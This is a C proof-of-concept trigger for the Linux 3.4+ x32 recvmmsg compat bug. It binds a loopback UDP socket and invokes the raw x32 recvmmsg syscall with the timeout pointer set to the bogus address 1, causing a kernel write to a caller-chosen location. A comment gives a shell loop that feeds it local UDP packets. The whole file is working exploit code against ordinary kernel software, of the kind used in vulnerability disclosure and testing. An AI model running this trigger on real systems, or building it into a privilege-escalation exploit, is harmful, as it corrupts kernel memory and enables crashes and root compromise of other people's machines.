/*
 * PoC trigger for the linux 3.4+ recvmmsg x32 compat bug, based on the manpage
 *
 * https://code.google.com/p/chromium/issues/detail?id=338594
 *
 * $ while true; do echo $RANDOM > /dev/udp/127.0.0.1/1234; sleep 0.25; done
 */

#define _GNU_SOURCE
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/syscall.h>

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)

int
main(void)
{
#define VLEN 10
#define BUFSIZE 200
#define TIMEOUT 1
    int sockfd, retval, i;
    struct sockaddr_in sa;
    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char bufs[VLEN][BUFSIZE+1];
    struct timespec timeout;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = htons(1234);
    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }

    memset(msgs, 0, sizeof(msgs));
    for (i = 0; i < VLEN; i++) {
        iovecs[i].iov_base         = bufs[i];
        iovecs[i].iov_len          = BUFSIZE;
        msgs[i].msg_hdr.msg_iov    = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    timeout.tv_sec = TIMEOUT;
    timeout.tv_nsec = 0;

//    retval = recvmmsg(sockfd, msgs, VLEN, 0, &timeout);
//    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, &timeout);
    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)1ul);
    if (retval == -1) {
        perror("recvmmsg()");
        exit(EXIT_FAILURE);
    }

    printf("%d messages received\n", retval);
    for (i = 0; i < retval; i++) {
        bufs[i][msgs[i].msg_len] = 0;
        printf("%d %s", i+1, bufs[i]);
    }
    exit(EXIT_SUCCESS);
}